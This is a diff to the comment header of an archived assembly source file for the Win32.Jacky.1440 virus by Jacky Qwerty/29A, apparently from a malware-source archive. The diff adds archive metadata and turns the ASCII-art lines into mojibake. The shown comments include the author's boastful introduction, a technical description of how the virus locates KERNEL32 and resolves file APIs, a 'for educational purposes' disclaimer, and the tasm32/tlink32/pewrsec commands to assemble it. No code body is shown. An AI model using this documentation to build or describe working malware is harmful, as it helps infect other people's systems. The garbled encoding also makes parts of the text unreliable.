@@ -1,9 +1,20 @@
+; ------------------------------------------------------------
+; name      J
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;
-;                                                  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
-;          Win32.Jacky.1440                        ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
-;          by Jacky Qwerty/29A                      ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
-;                                                  ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
-;                                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
+;                                                  ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+;          Win32.Jacky.1440                        ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½
+;          by Jacky Qwerty/29A                      ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+;                                                  ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½
+;                                                  ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½
 ;
 ; Hello ppl, welcome  to the first "Winblowz" 95/NT  fully compatible virus.
 ; Yea i didnt mistype above, it reads  "Win32" not "Win95" coz  this babe is
@@ -32,7 +43,7 @@
 ;
 ;
 ; Technical description
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; When Win32.Jacky executes,  it first looks  for KERNEL32  base adress usin
 ; the GetModuleHandleA API right from the host  import table and then it re-
 ; trieves all other file API function adressez by usin the GetProcAdress API
@@ -73,7 +84,7 @@
 ;
 ;
 ; AVP description
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; Before jumpin to the  source code, lets read what AVP has to say about the
 ; virus. Unfortunately as u will see they didnt test the thing on NT, other-
 ; wise they would have had a big surprise with it hehe #8D
@@ -117,7 +128,7 @@
 ;
 ;
 ; Greetingz
-; ÄÄÄÄÄÄÄÄÄ
+; ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; And finaly the greetinz go to:
 ;
 ;   Mr.Chan, Wai ......... Thx for your help and advice.. master!
@@ -128,13 +139,13 @@
 ;
 ;
 ; Disclaimer
-; ÄÄÄÄÄÄÄÄÄÄ
+; ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; This source code is for educational purposez only.  The author is not res-
 ; ponsible for any problemz caused due to the assembly of this file.
 ;
 ;
 ; Compiling it
-; ÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; tasm32 -ml -m5 -q -zn w32jacky.asm
 ; tlink32 -Tpe -c -x -aa w32jacky,,, import32
 ; pewrsec w32jacky.exe
